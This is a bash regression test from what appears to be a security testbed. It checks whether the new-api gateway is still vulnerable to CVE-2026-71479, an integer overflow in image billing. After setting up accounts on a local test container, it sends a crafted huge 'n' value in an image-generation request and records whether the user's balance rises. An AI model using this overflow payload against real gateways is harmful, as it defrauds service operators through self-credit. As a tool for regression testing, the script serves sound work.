#!/usr/bin/env bash
# new-api R3 recall cell (CVE-2026-71479): a user-controlled image `n` multiplies
# into the quota without an overflow-safe bound; a crafted value wraps the quota
# negative at settlement => self-credit (balance increases). Fixed rc.18.
# Signature: FAIL = balance strictly increased after the crafted-n billed call
# (positive control: a normal n=1 call bills, balance decreases). PASS = crafted
# call refused or balance did not increase. Rung up via testbed/newapi/up.sh.
# Usage: 23_newapi_r3.sh <rung> <image>
source "$(dirname "$0")/lib.sh"
NET="${NET:-pilot10}"; LABEL="${1:?rung}"; IMG="${2:?image}"
DIG="$(docker image inspect "$IMG" --format '{{range .RepoDigests}}{{.}}{{end}}' | sed 's/.*@//')"
out="$PILOT/results/recall.csv"
[ -f "$out" ] || echo "ts,gateway,rung,image_digest,advisory,subcell,verdict,observation,commit" > "$out"
row() { echo "$(date -u +%FT%TZ),new-api,$LABEL,$DIG,$1,$2,$3,\"$4\",$COMMIT" >> "$out"; printf '[%s/%s] %s — %s\n' "$1" "$2" "$3" "$4"; }
shc() { docker run --rm --network "$NET" --entrypoint sh "$DRIVER_IMG" -c "$1"; }

# One container does the full metered setup + the two billed calls, echoing the
# three quota readings (host-side numeric compare below).
OUT=$(shc '
set -e; B=http://p10-newapi:3000
curl -s -X POST $B/api/setup -H "Content-Type: application/json" -d "{\"username\":\"root\",\"password\":\"Rootpass123\",\"confirmPassword\":\"Rootpass123\",\"SelfUseModeEnabled\":false,\"DemoSiteEnabled\":false}" >/dev/null 2>&1 || true
curl -s -c /tmp/rc -o /dev/null -X POST $B/api/user/login -H "Content-Type: application/json" -d "{\"username\":\"root\",\"password\":\"Rootpass123\"}"
RH="-b /tmp/rc -H New-Api-User:1"
curl -s $RH -X POST $B/api/option/payment_compliance -H "Content-Type: application/json" -d "{\"confirmed\":true}" >/dev/null
curl -s $RH -X POST $B/api/channel/ -H "Content-Type: application/json" -d "{\"mode\":\"single\",\"channel\":{\"name\":\"img\",\"type\":1,\"key\":\"op-dummy\",\"base_url\":\"http://p10-mock:8080\",\"models\":\"dall-e-3,mock-model\",\"group\":\"default\",\"groups\":[\"default\"],\"status\":1}}" >/dev/null
curl -s $RH -X POST $B/api/user/ -H "Content-Type: application/json" -d "{\"username\":\"meter\",\"password\":\"Passw0rd!x\",\"display_name\":\"meter\"}" >/dev/null 2>&1 || true
U=$(curl -s -c /tmp/ac -X POST $B/api/user/login -H "Content-Type: application/json" -d "{\"username\":\"meter\",\"password\":\"Passw0rd!x\"}")
UID2=$(echo "$U" | grep -o "\"id\":[0-9]*" | head -1 | cut -d: -f2)
AH="-b /tmp/ac -H New-Api-User:$UID2"
CODE=$(curl -s $RH -X POST $B/api/redemption/ -H "Content-Type: application/json" -d "{\"name\":\"r\",\"quota\":500000,\"count\":1}" | sed "s/.*\"data\":\[\"//; s/\"\].*//")
curl -s $AH -X POST $B/api/user/topup -H "Content-Type: application/json" -d "{\"key\":\"$CODE\"}" >/dev/null
# meter creates its own token (unlimited so the token is not the binding constraint; user quota is)
curl -s $AH -X POST $B/api/token/ -H "Content-Type: application/json" -d "{\"name\":\"t\",\"unlimited_quota\":true,\"remain_quota\":0,\"expired_time\":-1}" >/dev/null
TID=$(curl -s $AH "$B/api/token/?p=1&size=10" | grep -o "\"id\":[0-9]*" | head -1 | cut -d: -f2)
KEY=$(curl -s $AH -X POST $B/api/token/$TID/key | grep -o "\"key\":\"[^\"]*\"" | head -1 | sed "s/\"key\":\"//;s/\"//")
getq(){ curl -s $RH $B/api/user/$UID2 | grep -o "\"quota\":[0-9-]*" | head -1 | cut -d: -f2; }
echo "UID=$UID2"; echo "KEYSET=${KEY:+yes}"
echo "Q0=$(getq)"
R1=$(curl -s -o /dev/null -w "%{http_code}" -X POST $B/v1/images/generations -H "Authorization: Bearer sk-$KEY" -H "Content-Type: application/json" -d "{\"model\":\"dall-e-3\",\"prompt\":\"x\",\"n\":1}"); echo "N1_CODE=$R1"
sleep 2; echo "Q1=$(getq)"
RH2=$(curl -s -o /dev/null -w "%{http_code}" -X POST $B/v1/images/generations -H "Authorization: Bearer sk-$KEY" -H "Content-Type: application/json" -d "{\"model\":\"dall-e-3\",\"prompt\":\"x\",\"n\":18446744073686646784}"); echo "NHUGE_CODE=$RH2"
sleep 2; echo "Q2=$(getq)"
')
g() { echo "$OUT" | sed -n "s/^$1=//p" | head -1; }
UID2=$(g UID); Q0=$(g Q0); Q1=$(g Q1); Q2=$(g Q2); N1=$(g N1_CODE); NH=$(g NHUGE_CODE)
obs="Q0=$Q0 Q1(n=1)=$Q1 Q2(nHuge)=$Q2 n1http=$N1 nHugeHttp=$NH"
if [ -z "$Q0" ] || [ -z "$Q2" ] || [ -z "$UID2" ]; then
  row CVE-2026-71479 metering INVALID "setup/quota read failed ($obs)"
elif [ "$N1" != 200 ] || [ "$(awk -v a="$Q1" -v b="$Q0" 'BEGIN{print (a<b)?1:0}')" != 1 ]; then
  row CVE-2026-71479 metering INVALID "positive control: normal n=1 did not bill (Q1>=Q0) ($obs)"
elif [ "$(awk -v a="$Q2" -v b="$Q1" 'BEGIN{print (a>b)?1:0}')" = 1 ]; then
  row CVE-2026-71479 metering FAIL "crafted n increased balance (self-credit): Q1->Q2 up ($obs)"
else
  row CVE-2026-71479 metering PASS "crafted n refused/bounded; balance not increased (nHugeHttp=$NH, Q2<=Q1) ($obs)"
fi
echo "--- $out"
